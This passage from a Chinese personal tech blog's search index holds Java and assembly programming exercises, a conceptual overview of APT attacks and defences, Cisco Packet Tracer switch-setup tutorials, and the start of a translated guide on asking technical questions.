THREE XCHG AX,DATA1[SI+2] XCHG AX,[SI] THREE: CMP SI,BX JE ONE ADD SI,2 JMP TWO EXIT: MOV AH,4CH INT 21H CODES ENDS END START 汇编 语言实现冒泡排序示例代码 👆 3.算法比较： 排序算法 平均时间复杂度 冒泡排序 O(n²) 选择排序 O(n²) 插入排序 O(n²) 希尔排序 O(n1.5) 快速排序 O(N * logN) 归并排序 O(N * logN) 堆排序 O(N * logN) 基数排序 O(d(n + r)) ","link":"https://Xing-Fax.GitHub.io/post/bubble-sort/"},{"title":"JAVA 国王遗产问题","content":"📝X国是一个小国，国王K有6个儿子 😇在临终前立下遗嘱： ​ 国王有一批牛作为遗产要分给6个儿子，其中大儿子分1/4，二儿子分1/5，三儿子分1/6......直到小儿子分1/9，最后剩下11头牛，分给管家，请计算国王这一批遗产中一共有多少头牛？ ✏解决一：穷举法 ✒先大致估算出一个范围我这里估算的是5000 for (int i = 1; i&lt;= 5000;i += 2){ //循环体 } ✒首先要满足六个儿子分的牛，即 if (i % 4 == 0 &amp;&amp; i % 5 == 0 &amp;&amp; i % 6 == 0 &amp;&amp; i % 7 == 0 &amp;&amp; i % 8 == 0 &amp;&amp; i % 9 == 0)//得到一个可能为遗产的数字 ✒然后将循环体中的i减去六个儿子一共分的牛，判断是不是等于11(因为最后剩11头牛) int Sum = i / 4 + i / 5 + i / 6 + i / 7 + i / 8 + i / 9;//分给儿子的牛 if (i - sum == 11) //判断是不是还剩下11头牛 如果以上符合上述条件，即得出国王一共有几头牛，最后打印输出🎉 📑运行源码： package Project; public class Universal { public static void main(String[] args) { for (int i = 0; i &lt;= 5000; i += 2) { if (i % 4 == 0 &amp;&amp; i % 5 == 0 &amp;&amp; i % 6 == 0 &amp;&amp; i % 7 == 0 &amp;&amp; i % 8 == 0 &amp;&amp; i % 9 == 0) { int Sum = i / 4 + i / 5 + i / 6 + i / 7 + i / 8 + i / 9; if (i - Sum == 11) { System.out.println(i);//打印结果 break;//退出循环 } } } } } ✏解决二：数学法 可以一行解决，所以就不多概述了 📑运行源码： package Project; public class Universal { public static void main(String[] args) { double Sum = 1 - 1.0/4 - 1.0/5 - 1.0/6 - 1.0/7 - 1.0/8 - 1.0/9; System.out.print(&quot;国王共有 &quot; + Math.rint(11/Sum) + &quot;头牛&quot;); } } 最后计算结果2520，完美散花~🎉🎉🎉 ","link":"https://Xing-Fax.GitHub.io/post/java-heritage/"},{"title":"JAVA 百马百担","content":"📝现有100匹马，需要驮100担货 其中大马能驮3担，中马能驮2担，两批小马能驮1担 📌问：驮100担货，大马、小马、中马各需要多少？ ✏解法一：穷举法 使用三个For循环遍历大马，小马，中马 //i为大马，j为中马，k为小马 for (int i = 0; i &lt; 100; i++) { for (int j = 0; j &lt; 100; j++) { for (int k = 0; k &lt; 100; k++) { //遍历 } } } ✒然后根据题意写判断条件大马的计算方式为数量 * 3，中马为数量 * 2，小马两匹马驮一担所以 / 2即可 if (i * 3 + j * 2 + k / 2 == 100) //最后驮的数量为100 😟但是题目要求是百马百担，现在只得出了如何百担，显然题目要求使用100匹马，所以就要再加一个判断条件 if (i + j + k == 100) //马的数量必须为100批 😣但是这个依然不是我们想要的结果，因为疏忽了2匹小马驮1担，所以小马的数量必须为2的倍数 if (k % 2 == 0) //两批小马驮1担，需要为2的倍数 ✨以上三个条件即可满足For循环的遍历条件，为了减少代码沉余，所以将三个判断条件合并，即为 if (i * 3 + j * 2 + k / 2 == 100 &amp;&amp; i + j + k == 100 &amp;&amp; k % 2 == 0) 🎉最后在if语句块内打印符合条件的大马，中马，小马的的数量就好啦~~~ System.out.println(i + &quot;\\t&quot; + j + &quot;\\t&quot; + k);//分别打印大马，中马，小马数量 📑运行源码： package Project; public class Universal { public static void main(String[] args) { System.out.println(&quot;大&quot; + &quot;\\t&quot; + &quot;中&quot; + &quot;\\t&quot; + &quot;小&quot;); for (int i = 0; i &lt; 100; i++) { for (int j = 0; j &lt; 100; j++) { for (int k = 0; k &lt; 100; k++) { if (i * 3 + j * 2 + k / 2 == 100 &amp;&amp; i + j + k == 100 &amp;&amp; k % 2 == 0) { System.out.println(i + &quot;\\t&quot; + j + &quot;\\t&quot; + k); } } } } } } ✏解法二：数学法 设大马X匹，中马Y匹，小马Z匹 ✒得方程组①②③④⑤ ↓ {3X+2Y+Z2=100X+Y+Z=100X≥ 0Y≥0Z≥0,Z&amp;1==0\\begin{cases} 3X+2Y+\\frac Z2 = 100 \\\\ X+Y+Z = 100\\\\ X \\geq\\ 0 \\\\ Y \\geq 0 \\\\ Z \\geq 0, Z\\&amp;1 == 0\\\\ \\end{cases} ⎩⎪⎪⎪⎪⎪⎪⎨⎪⎪⎪⎪⎪⎪⎧​3X+2Y+2Z​=100X+Y+Z=100X≥ 0Y≥0Z≥0,Z&amp;1==0​ 其中的Z&amp;1 == 0，是将小马限制为偶数 ✒由 ①②式可得到⑥⑦式↓ {3X+2Y=100−Z2X+Y=100−Z\\begin{cases} 3X+2Y= 100 -\\frac Z2\\\\ X+Y = 100 -Z\\\\ \\end{cases} {3X+2Y=100−2Z​X+Y=100−Z​ ✒解得到⑧⑨式↓ {Y=1.5Z−100Y=200−2.5Z\\begin{cases} Y = 1.5Z - 100\\\\ Y=200-2.5Z\\\\ \\end{cases} {Y=1.5Z−100Y=200−2.5Z​ ✒将⑧⑨式带入③④式得到⑩式↓ 2003≤ Z≤ 80\\frac {200}{3} \\leq\\ Z \\leq\\ 80 3200​≤ Z≤ 80 ✒又由⑤式得⑪式↓ 68≤ Z≤ 80&amp;&amp;Z&amp;1==068 \\leq\\ Z \\leq\\ 80\\&amp;\\&amp; Z\\&amp;1 == 0 68≤ Z≤ 80&amp;&amp;Z&amp;1==0 使用⑧⑨⑪得出计算方法↓ for (int Z = 68; Z &lt;= 80;Z += 2){ X = (Z / 2) * 3 - 100; //得出中马数量 Y = 200 - (Z / 2) * 5; //得出小马数量 //Print... } 📑运行源码： package Project; public class Universal { public static void main(String[] args) { System.out.println(&quot;大&quot; + &quot;\\t&quot; + &quot;中&quot; + &quot;\\t&quot; + &quot;小&quot;); for(int Z = 68 ; Z &lt;= 80;Z += 2){ int X = (Z / 2) * 3 - 100; int Y = 200 - (Z / 2) * 5; System.out.println(X+ &quot;\\t&quot; + Y + &quot;\\t&quot; + Z); } } } 完美散花~🎉🎉🎉 ","link":"https://Xing-Fax.GitHub.io/post/java-horses/"},{"title":"APT 攻击综述及研究","content":"APT攻击综述及研究 1.什么是APT攻击？ APT攻击（Advanced Persistent Threat，高级持续性威胁） 是利用先进的攻击手段对特定目标进行长期持续性网络攻击的攻击形式。APT攻击也称为定向威胁攻击，指某组织对特定对象展开的持续有效的攻击活动。这种攻击活动具有极强的隐蔽性和针对性，通常会运用受感染的各种介质、供应链和社会工程学等多种手段实施先进的、持久的且有效的威胁和攻击。 2.APT攻击的特点 隐蔽性 0-Day漏洞、无文件攻击、加密流量 ， 能绕过目标所在网络的防御系统 持续性 潜伏时间长、攻击时间跨度大，通常在目标网络中潜伏几个月甚至几年 针对性 所有的攻击方法都只针对特定目标和特定系统 ， 目标明确 模块化 各类攻击工具能够紧密的和其它工具相互配合，灵活性极强 3.APT攻击与传统攻击区别 组织性 APT攻击通常是有一个或者多个组织发起的攻击，具有强烈的目标性，通常有大量的资源支持和帮助，而传统攻击一般是由个人或者群体发起 目标针对性 APT攻击组织不会盲目攻击，而是针对性的选择一个目标进行攻击，此类目标往往具有军事，政治类的，具有较高价值的目标，而传统通常采用无差别攻击手段 攻击战术 APT攻击的手段多别且复杂，同时掌握有大量的0-Day漏洞，传统检测技术很难检测到被攻击，而传统攻击一般采用流量泛滥或者已知公开漏洞攻击 高隐蔽性 APT攻击采用加密隧道进行通信，基于流量检测的防御很难发挥作用，而传统攻击时使用普通连接或未加密隧道进行攻击 持续时间长 APT攻击往往会持续数年时间，而传统攻击往往时一次性的，通常也不会对目标主机留下后门 4.APT攻击基本流程 情报收集 攻击方使用钓鱼、扫描、嗅探、监听、社会工程学等等手段去寻找目标，并对目标进行画像生成，如子域名，服务器版本，SQL数据库版本、已知漏洞而当等 资源开发 通过购买或者入侵大量机器，租借可用的基本网络设施，服务器等资源为接下来的攻击做好准备 初始访问 利用0-Day漏洞、N-Day漏洞，编写对目标主机定制化的工具 C2通信 向肉鸡进行样本投递，使得C2服务器和目标主机建立通信加密隧道 横向移动 攻击者通过C2服务器对内网中的主机进行横向渗透，最终拿下内网主机的控制权，同时给靶机留下后门程序，便于持续攻击。 资产发现 使用扫描工具扫描内网主机的指纹信息，比如ip，开放端口，未修复的已知漏洞 数据泄露 攻击者会将靶机敏感信息压缩、加密，然后通过加密隧道窃取 5.APT攻击检测困难 像要发现和检测一起APT攻击极为困难，同时传统的APT攻击检测存在一定的缺陷 APT攻击时间跨度长，缺乏方法或工具有效将信息进行关联，还原攻击链 实时检测困难，较难高效地从百万条日志中筛选数据，并检测出最可能的攻击行为 较难让分析人员通过数据有效地进行推理，从而检测未知攻击 缺乏对真实场景的APT攻击进行检测，并且IDS和SIEM会产生大量的信息，传统方法识别真实的攻击更加困难 无法有效解决投毒攻击，即由于APT攻击时间跨度较长，深度学习会将恶意特征训练为正常特征 6.APT攻击的溯源 对APT组织画像 通过对攻击方的攻击方式，以及流程，攻击习惯，技术特点等信息生成一副画像，以便后续的溯源过程 通过异常行为进行攻击溯源 其原理是通过对网络中的正常行为模式建模。核心技术包括元数据提取、正常行为建模和异常检测算法。该方案同样能够检测未知攻击 样本溯源 样本的静态特征有语言、pdb、字符串等，pdb文件主要存储了VS调试程序时所需要的基本信息，主要包括源文件名、变量名、函数名、FPO(帧指针)、对应的行号等等。可以通过样本的聚类和同源分析，ip、domain、url、md5等的关联实现溯源 4.如何防范APT攻击 沙箱技术 虚拟化系统是防御APT攻击的主要手段之一，通过虚拟化技术形成一个模拟化的系统，将本地系统的进程，内存，磁盘，以及一些系统关机设置与模拟环境相互隔离，以上帝视角的方式来观察恶意代码的运行方式，同时可以通过重定向技术隔离病毒对本地程序的修改 信誉技术 安全信誉是对互联网资源和服务相关实体安全可信性的评估和看法， 通过建立信誉库，包括WEB URL信誉库、文件MD5码库、僵尸网络地址库、威胁情报库等，可以为新型病毒、木马等APT攻击的检测提供强有力的技术辅助支撑，将进一步提高安全新品的安全防护能力 主机漏洞防护技术 针对横向移动与内部资料进行挖掘和探测的防御，可采用主机漏洞防护技术，能侦测任何针对主机漏洞的攻击并加以拦截，进而保护未修补的主机。这类解决方案可实现档案 / 系统一致性监控，保护未套用修补程序的主机，防止已知和0-Day漏洞攻击 异常流量分析技术 采用旁路接入方式提取流量信息，可以针对帧数、帧长、协议、端口、CPU/RAM消耗、宽带占用等进行监测，并基于时间、拓扑、节点等多种统计分析手段，建立流量行为轮廓和学习模型来识别流量异常情况，进而判断并识别0Day漏洞攻击等。 数据防泄露技术 针对资料外传的风险，一般可采用加密和资料外泄防护 (DLP)技术，将关键、敏感、机密的数据加密，DLP 可提供一层额外的防护来防止数据外泄，这类工具通常很复杂，而且有些部署条件，例如：数据要分类，要定义政策和规则等 大数据分析技术 网络系统本身产生的大量日志数据，SOC安管平台产生的大量日志信息，均可以利用大数据分析技术进行大数据再分析，运用数据统计、数据挖掘、关联分析、态势分析等从记录的历史数据中发现APT攻击的痕迹，以弥补传统安全防御技术的不足 ","link":"https://Xing-Fax.GitHub.io/post/apt-attack-overview/"},{"title":"JAVA 求回文数","content":"📝求1 - 1000之间的回文数，并且依次输出 回文数即一个数的逆序和正序完全相同，如12321 逆序后是12321，仍然是原来的数 🤔算法分析： 首先负数不是回文数如-12321，其次末尾是0的也不是回文数如 100，120 所以小于0或者能被10整除的数直接Pass🙃采用For循环作为1 - 1000的遍历 //i为For循环遍历数 if (i &lt; 0 || (i % 10 == 0)) continue; //进入下一次循环 剔除这些不符合条件的数后，开始对数进行反转 可以使用依次取数的最低位，然后依次相加(相加后剔除原数的最低位)，结束循环体条件为：依次相加最低为的数大于原来的数😋 //Num为暂存反转后的数，Value为要反转的数 while(Num &lt; Value){ Num = (Num * 10); //乘十进位 Num += (Value % 10); //加上最低位 Value /= 10; //舍弃最低位 } 最后判断Num和Value是否相等即可，但是有一个情况需要判断，因为奇数的位数不能被均分，如121，上文代码循环后Num = 12，Value = 1，所以Num要舍弃最低位，即Value /= 10😋 if(Value == Num || Value == Num / 10) //True为此数是回文数，反之则否 📑运行源码： package Project; public class Universal { public static void main(String[] args) { for(int i = 0;i &lt;= 1000;i++){ if(i &lt; 0 || (i % 10 == 0)) continue; int Num = 0,Value = i; while(Num &lt; Value){ Num = (Num * 10); Num += (Value %10); Value /= 10; } if(Value == Num || Value == Num /10) System.out.print(i + &quot;、&quot;); } } } ","link":"https://Xing-Fax.GitHub.io/post/java-palindromes/"},{"title":"JAVA 折扣问题","content":"📝用户输入VIP等级计算商品折扣价格 VIP等级：VIP-1级打9折，VIP-2级打8折，VIP-3级打7折，其他等级不打折🙃 商品原价为4500元 📖数据结构： 等级 折扣 VIP 1 级 9 折 VIP 2 级 8 折 VIP 3 级 7 折 不是VIP 10折 🤔算法分析： 共分三个等级，随着VIP等级数增高，折扣数降低， 通过找寻规律得到10减去等级数等于折扣数😋 ✏算法编写： //Max为最大等级数，Min为最小等级数，VIP为当前等级数 ((VIP &lt;= Max &amp; VIP &gt;= Min) ? (10 - VIP): 10); //求折扣数 如果等级数在设定范围内，则进行相应的折扣 如果不在，则按照10折(原价)进行折扣 📑运行源码： package Project; import java.util.Scanner; public class Universal { public static void main(String[] args) { Scanner Scan = new Scanner(System.in); System.out.printf(&quot;请输入会员等级：&quot;); int VIP = Scan.nextInt(); int Price = ((VIP &lt;= 3 &amp; VIP &gt;=1) ? (10 - VIP): 10); System.out.println(&quot;您享有的优惠是：&quot; + Price + &quot;折&quot;); System.out.println(&quot;此商品折扣前是：&quot; + 4500.0 + &quot;元&quot;); System.out.println(&quot;此商品折扣后是：&quot; + 4500 * (Price / 10.0) + &quot;元&quot;); Scan.close(); } } ","link":"https://Xing-Fax.GitHub.io/post/java-discount/"},{"title":"JAVA 位号求排数","content":"📝现有一间教室，座位为每八个一排 现有学生48人，学生采取抽签的形式选座位(签数范围1-48) 要求用户输入抽到的数字并计算改学生在第几排？ 提示：1 - 8为第一排，9 - 16为第二排...以此类推 📖座位结构： 第一排 1 - 8， 第二排 9 - 16 第三排 17 - 24， 第四排 25 - 32 第五排 33 - 40， 第六排 41 - 48 🤔算法分析： 每排8个人，使用序号范围1 - 48，48 ÷ 8 = 6，6排正好够容纳48人 使用抽选到的序号除8，如33 / 8 = 4.1，如有小数则向上取整，即得5，第五排 使用抽选到的序号除8取余，如33 / 8 = 4余1，即得1，第5排的第1位 注:余数如果为0则为第8位，如40 / 8 = 5余数0，为第8位 ✏算法编写： //Num为抽取序号，Mark为每排的人数 (int)Math.rint(Num / Mark + 0.4) //求排数 (int)((Num % Mark != 0) ? Num % Mark : Mark) //求位数 除数结果加0.4是为了向上取整，通过系统函数进行四舍五入 但由于函数返回类型是双精度，所以最后要使用强制转换转为整数 由于题目并没有要求得出结果排数的第几名，所以只求出学生所在排数即可 📑运行代码： package Project; import java.util.Scanner; public class Universal { public static void main(String[] args) { Scanner Scan = new Scanner(System.in); System.out.printf(&quot;请输入学生序号：&quot;); float Num = Scan.nextFloat(); System.out.printf(&quot;这个学生座位在：第&quot;); System.out.printf((int)Math.rint(Num / 8 + 0.4) + &quot;排&quot;); Scan.close(); } } ","link":"https://Xing-Fax.GitHub.io/post/java-seat/"},{"title":"2.7.6 实施基本连接","content":"Packet Tracer - 配置初始交换机设置 教学文件下载 2.7.6 📌地址分配表： 设备 接口 IP地址 子网掩码 S1 WLAN1 192.168.1.253 255.255.255.0 S2 WLAN2 192.168.1.254 255.255.255.0 PC1 网卡 192.168.1.1 255.255.255.0 PC2 网卡 192.168.1.2 255.255.255.0 📌目标： 第 1 部分：对S1和S2进行基本配置 第 2 部分：配置两台PC机 第 3 部分：配置交换机管理界面 ✒摘要： 在本节的练习中，你需要先对交换机进行基本的配置，然后通过在交换机和PC机上配置IP地址等参数来完成基本连接。 第一部分：对S1和S2进行基本配置 步骤一：为S1配置主机名称 轻击S1，然后选择CLI选项卡 键入正确的命令，将主机名称配置为S1 步骤二：配置控制台和加密特权EXEC模式密码 使用cisco作为控制台密码 使用class作为特权EXEC密码 步骤三：验证S1的密码配置 如何检验两个密码是否都配置正确？ 任何使用适当的标语警告未授权的访问？ 步骤四：将配置文件保存到NVRAM 如何将当前配置保存到NVRAM？ 步骤五：重复配置S2，从步骤一到步骤四 如果您忘记了命令，请翻阅上一章的教学 2.5.5 配置初始交换机配置 第 1 部分：对S1和S2进行基本配置🎉 第二部分：配置PC机 此部分会教您如何配置PC机器的IP地址并且测试连接是否正常😋 步骤一：为两台PC机配置IP地址 轻击PC1，选择桌面(Desktop)选项卡 选择IP配置(IP Configuration) 在IPv4 Address右侧的输入框内输入S1的IP地址，同时输入子网掩码，然后关闭窗口 然后为PC2重复此步骤 步骤二：验证交换机的连接 轻击PC1，在桌面选项卡中选择命令提示符，然后键入以下命令后按 Enter 键 C:\\&gt; Ping 192.168.1.253 是否成功？请说明原因🤔 注：Ping 命令常用于测试两台设备是否能相互通信😃 如果您不知道应该配置什么样的IP地址，请查阅本章顶部的表格 无法正常Ping是因为交换机并没有配置有效的IP地址✨ 第 2 部分：配置两台PC机🎉 第三部分：为S1和S2配置VLAN IP地址 步骤一：配置S1和S2的IP地址 使用以下命令来配置交换机IP地址 S1(config)# Interface Vlan 1 S1(config-if)# IP Address 192.168.1.253 255.255.255.0 S1(config-if)# No Shutdown 使用No Shutdown命令作用是激活接口即启用以太网接口 重复此步骤为S2配置对应的IP😋 步骤二：检验S1和S2上的IP地址配置 可以使用 Show IP Interface Brief显示交换机所有的端口的IP地址与状态，也可以使用Show Running-Config 命令 S1# Show IP Interface Brief S1# Show Running-Config 步骤三：将S1和S2的配置保存到NVRAM 如何将当前配置保存到NVRAM?🤔 步骤四：验证网络连接 使用Ping命令来验证网络的连接，整个网络必须完全连通，如果存在问题必须采取纠正措施 从PC1 Ping S1/S2 从PC2 Ping S1/S2 从S1 Ping PC1/PC2 从S2 Ping PC1/PC2 ...... 注：在交换机上也可以使用Ping命令😮 第 3 部分：配置交换机管理界面🎉 ","link":"https://Xing-Fax.GitHub.io/post/cisco-basic-connect/"},{"title":"2.5.5 配置初始交换机设置","content":"Packet Tracer - 配置初始交换机设置 教学文件下载 2.5.5 📌目标： 第一部分：验证默认交换机配置 第二部分：创建基本交换机配置 第三部分：配置MOTD标语 第四部分：保存和验证配置文件到NVRAM 第五部分：配置S2 第一部分：验证默认交换机配置 步骤一：进入特权 EXEC 模式 在特权 EXEC 模式下，您可以使用全部交换机命令。不过由于一些特权命令会直接操作交换机系统参数，因此要使用密码对特权的访问加以保护，防止未授权的使用🤨 特权 EXEC 模式能执行所有用户模式中的命令，并在此基础上增加了许多额外的命令 单击S1，进入CLI选项卡后轻击 Enter 键 ，键入 Enable 后轻击 Enter 键 Switch&gt; Enable Switch# 📌注：特权模式下命令前缀会由&gt;变为# 步骤二：检查当前交换机配置 键入 Show Running-Config 后轻击 Enter 键 Switch# Show Running-Config 此命令会显示交换机基本配置信息入接口数量、类型等等... 轻击 Blank 键进入下一页，Enter 键进入下一行 检验默认交换机配置🎉 第二部分：创建基本交换机配置 步骤一：为交换机配置新名称 在进入特权模式后键入Configure Terminal后轻击 Enter 键进入全局配置模式 输入HostName [Name]，Name为你想要设置的新名称😮 Switch# Configure Terminal Switch(config)# HostName S1 S1(config)# 📌注：命令输入对大小写无要求 步骤二：对控制台进行密码保护 先进入全局配置模式，在进入Line模式，并对控制台进行密码设置为letmein Line Console 0 其中的0代表其编号为0，通常利用该端口进行本地登录 并配置信息😋 S1(config)# Line Console 0 S1(config-line)# Password letmein S1(config-line)# Login S1(config-line)# Exit S1(config)# 如果想要你设置的密码生效应键入Login命令 通过执行Exit命令可以返回到上一级，入在Line模式则返回到全局配置模式 步骤三：检验密码是否生效 通过键入 Enter+Z 可在任意模式下退出到特权模式， 在特权模式下键入Exit退出，然后轻击 Enter 键 此时键入密码letmein后轻击 Enter 键后进入控制台 S1# Exit S1 con0 is now available Press RETURN to get started. User Access Verification Password: S1&gt; 如果没有要求输入密码请检查上一步骤是否正确输入🤔 📌注：为安全起见，在键入密码时控制台不会显示密码，输入完毕后轻击 Enter即可 步骤四：为特权模式设置密码 用户模式下只能执行一些基本的命令且无法对交换机系统设置进行更改，特权模式拥有完全的控制权限，如果误操作后可能交换机无法正常的运行，因此要对特权模式配置密码 进入全局配置模式，键入以下命令 S1(config)# Enable Password Cisco 此时特权模式密码已被设置😀 步骤五：验证特权模式密码是否生效 重复执行本节的步骤三 输入Enable命令后轻击 Enter 键后出现输入密码界面 S1&gt; En Password: 输入设置的密码Cisco后轻击 Enter 键，密码正确即可进入特权模式 📌注：控制台密码和特权模式密码都是以明文形式存储，通过显示配置文件即可得到您的密码，会带来额外的安全风险😟 步骤六：配置加密密码以保护特权模式 应该使用 Enable Secret 命令代替 Enable Password 命令 进入全局配置模式，键入以下命令 S1(config)# Enable Secret Itsasecret 此时本节步骤四配置的密码即失效，新的特权模式密码被配置为Itsasecret 步骤七：加密Enable和控制台密码 通过键入Show Running-Config命令后可以查看到特权模式和控制台明文密码，为了保障安全，需要对此明文进行加密📝 进入全局配置模式下，键入以下命令 S1(config)# Service Password-Encryption 现在再次执行Show Running-Config命令，密码即被加密后显示 Blowfish加密是CAT版本交换机的blowfish加密算法，在Cisco的交换机里面，开头字母是222 , IOS版本的是MD5的加密 创建基本交换机配置🎉 第三部分：配置MOTD标语 思科 IOS 命令集中包含一项功能， 可以在任何人登录交换机时，向其显示一些消息，这些消息称为登录标语，您应该把标语文本括在引号中，也可以使用其他定界符，但定界符不能与 MOTD 字符串中出现的任何字符相同了😊 步骤一：配置登录标语(NOTD) 进入全局配置模式，键入如下命令 S1(config)# Banner Motd &quot;Login Banner&quot; 此时登录标语即被设置为Login Banner在你首次登录交换机时会显示此标语 配置MOTD标语 🎉 第四部分：保存和验证配置文件到NVRAM 到此您已完成交换机的基本配置，现在需要将运行中的配置文件备份到NVRAM，确保不会因为系统意外断电导致配置丢失，在特权模式下键入以下命令 S1# Copy Running-Config Startup-Config 此时会提示您是否覆盖目标文件，轻击 Enter 键即可完成执行 保存和验证配置文件到NVRAM🎉 第五部分：配置S2 您已经完成S1的基本配置，现在请重复配置S2，如果您不记得命令，可以通过翻阅一至四部分获取帮助😀 第 5 部分：配置 S2🎉 ","link":"https://Xing-Fax.GitHub.io/post/cisco-initial-switch/"},{"title":"提问的智慧","content":"提问的智慧 Info How To Ask Questions The Smart Way Copyright © 2001,2006,2014 Eric S. Raymond, Rick Moen 本指南英文版版权为 Eric S. Raymond, Rick Moen 所有。 原文网址：http://www.catb.org/~esr/faqs/smart-questions.html Copyleft 2001 by D.H.Grand(nOBODY/Ginux), 2010 by Gasolin, 2015 by Ryan Wu 本中文指南是基于原文 3.10 版以及 2010 年由 Gasolin 所翻译版本的最新翻译； 协助指出翻译问题，请发 issue，或直接发 pull request 给我。 弃权申明 许多项目的网站在如何取得帮助的部分链接了本文，这没有关系，也正是我们想要的。但如果你是该项目生成此链接的网管，请在链接附近显著位置注明：我们不提供该项目的服务支持！ 我们已经领教了没有此说明带来的痛苦，我们将不停地被一些白痴纠缠，他们认为既然我们发布了本文，那么我们就有责任解决世上所有的技术问题。 如果你是因为需要帮助正在阅读本文，然后就带着可以直接从作者那取得帮助的印象离开，那么 你 就不幸成了我们所说的白痴之一。 别向 我们 提问，我们不会理睬的。 我们只是在这教你如何从那些真正懂得你软硬件问题的人那里取得帮助，但 99.9％ 的时间我们不会是那些人。除非你非常地 确定 本文的作者是你遇到问题方面的专家，请不要打搅，这样大家都更开心一点。 引言 在 黑客 的世界里，你所提技术问题的解答很大程度上取决于你提问的方式与解决此问题的难度，本文将教你如何提问才更有可能得到满意的答复。 开源程序的应用已经很广，你通常可以从其他更有经验的用户而不是黑客那里得到解答。这是好事，他们一般对新手常有的毛病更容忍一点。然尔，使用我们推荐的方法，象对待黑客那样对待这些有经验的用户，通常能最有效地得到问题的解答。 第一件需要明白的事是黑客喜欢难题和激发思考的好问题。假如不是这样，我们也不会写本文了。如果你能提出一个有趣的问题让我们咀嚼玩味，我们会感激你。好问题是种激励与礼物，帮助我们发展认知，揭示没有注意或想到的问题。在黑客中，“好问题！” 是非常热烈而真挚的赞许。 此外，黑客还有遇到简单问题就表现出敌视或傲慢的名声。有时，我们看起来还对新手和愚蠢的家伙有条件反射式的无礼，但事情并不真是这样。 我们只是毫无歉意地敌视那些提问前不愿思考、不做自己家庭作业的人。这种人就象时间无底洞──他们只知道索取，不愿意付出，他们浪费了时间，这些时间本可用于其它更有趣的问题或更值得回答的人。我们将这种人叫做 “失败者（loser）” （由于历史原因，我们有时将“loser”拼写为“lusers” 。） 我们意识到许多人只是想使用我们写的软件，他们对学习技术细节没有兴趣。对大多数人而言，计算机只是种工具，是种达到目的的手段而已。他们有自己的生活并且有更要紧的事要做，我们承认这点，也从不指望每个人都对这些让我们着迷的技术问题感兴趣。不过，我们回答问题的风格是为了适应那些真正对此有兴趣并愿意主动参与解决问题的人，这一点不会变，也不该变。如果连这都变了，我们就会在自己能做得最好的事情上不再那么犀利。 我们（大多数）是自愿者， 从自己繁忙的生活中抽时间来回答问题，有时会力不从心。因此，我们会毫不留情地滤除问题，特别是那些看起来象是失败者提的，以便更有效地把回答问题的时间留给那些胜利者。 如果你认为这种态度令人反感、以施惠者自居或傲慢自大，请检查你的假设，我们并未要求你屈服──事实上，假如你做了该做的努力，我们中的大多数将非常乐意平等地与你交流，并欢迎你接纳我们的文化。试图去帮助那些不愿自救的人对我们简直没有效率。不懂没有关系，但愚蠢地做事不行。 所以，你不必在技术上很在行才能吸引我们的注意，但你 必须 表现出能引导你在行的姿态──机 敏、有想法、善于观察、乐于主动参与问题的解决。如果你做不到这些使你与众不同的事情，我们建议你付钱跟别人签商业服务合同，而不是要求黑客无偿帮助。 如果你决定向我们求助，你不会想成为一名失败者，你也不想被看成一个失败者。得到快速有效回答的最好方法是使提问者看起来象个聪明、自信和有想法的人，并且暗示只是碰巧在某一特别问题上需要帮助。 （欢迎对本文指正，可以将建议发至 esr@thyrsus.com 或 respond-auto@linuxmafia.com。 请注意，本文不想成为一般性的 网络礼仪 指南，我一般会拒绝那些与引出技术论坛中有用的回答不特别相关的建议。） 提问前 在通过电邮、新闻组或论坛提技术问题以前，做以下事情： 尝试在你准备提问论坛的历史文档中搜索答案 尝试搜索互联网以找到答案 尝试阅读手册以找到答案 尝试阅读“常见问题文档”（FAQ）以找到答案 尝试自己检查或试验以找到答案 尝试请教懂行的朋友以找到答案 如果你是程序员，尝试阅读源代码以找到答案 提问时，请先表明你已做了上述事情，这将有助于建立你不是寄生虫与浪费别人时间的印象。最好再表述你从中 学到的东西 ，我们喜欢回答那些表现出能从答案中学习的人。 运用某些策略，比如用谷歌（Google）搜索你遇到的各种错误提示（既搜索 谷歌论坛，也搜索网页）， 这样很可能直接就找到了解决问题的文档或邮件列表线索。 即使没有结果，在邮件列表或新闻组寻求帮助时提一句“我在谷歌中搜过下列句子但没有找到什么有用的东西” 也是件好事，至少它表明了搜索引擎不能提供哪些帮助。将搜索关键词与你的问题及可能的解决方案联系起来，还有助于引导其他有类似问题的人。 别着急，不要指望几秒钟的谷歌搜索就能解决一个复杂的问题。读一下常见问题文档。在向专家提问之前，先向后靠靠放松一下，再思考一下问题。相信我们，他们能从你的提问看出你做了多少阅读与思考，如果你是有备而来，将更有可能得到解答。不要将所有问题一股脑抛出，只因你的第一次搜索没有结果（或者结果太多）。 认真地思考，准备好你的问题。轻率的提问只能得到轻率的回答，或者压根没有。在提问时，你越是表现出在此前做过思考与努力去解决自己的问题，你越有可能得到真正的帮助。 注意别提错问题。如果提问基于错误的假设，某黑客多半会一边想 “愚蠢的问题……”，一边按将错就错的答案回复你，并且希望这种只是得到你自己“问的问题”而非真正所需的解答，给你一个教训。 永远不要假设你 有资格 得到解答。你没有这种资格，毕竟你没有为此服务付费。如果你能够提出有内容、有趣和激励思考的问题──那种毫无疑问能够向社区贡献经验，而不仅仅是消极地要求从别人那获取知识的问题，你将“挣到”答案。 另一方面，表明你有能力也乐意参与问题的解决是个很好的开端。“有没有人能指个方向？”，我这还差点什么？”，“我应该查哪个网站？”，通常要比 “请给出我可以用的完整步骤”更容易得到回复，因为你表明了只要有人能指个方向，你就很乐意完成剩下的过程。 提问时 仔细挑选论坛 要对在哪提问留心，如果你做了下述事情，多半会被一笔勾销或被看成“失败者”： 张贴与论坛主题无关的问题 在面向高级技术问题的论坛上张贴肤浅的问题，或者反之。 在太多不同的新闻组同时张贴 给既非熟人也没有义务解决你问题的人发送你私人的电邮 为保护通信的渠道不被无关的东西淹没，黑客会除掉那些没有找对地方的问题，你不会想让这种事落到自己头上的。 因此，第一步是找对论坛。谷歌和其它搜索引擎还是你的朋友，可以用它们搜索你遇到困难的软硬件问题最相关的项目网站。那里通常都有项目的常见问题（FAQ）、邮件列表及文档的链接。如果你的努力（包括 阅读 FAQ）都没有结果，这些邮件列表就是最后能取得帮助的地方。项目的网站也许还有报告Bug的流程或链接，如果是这样，去看看。 向陌生的人或论坛发送邮件极有可能是在冒险。譬如，不要假设一个内容丰富的网页的作者想充当你的免费顾问，不要对你的问题是否会受到欢迎做太乐观的估计──如果你不确定，向别处发或者压根别发。 在选择论坛、新闻组或邮件列表时，别太相信名字，先看看 FAQ 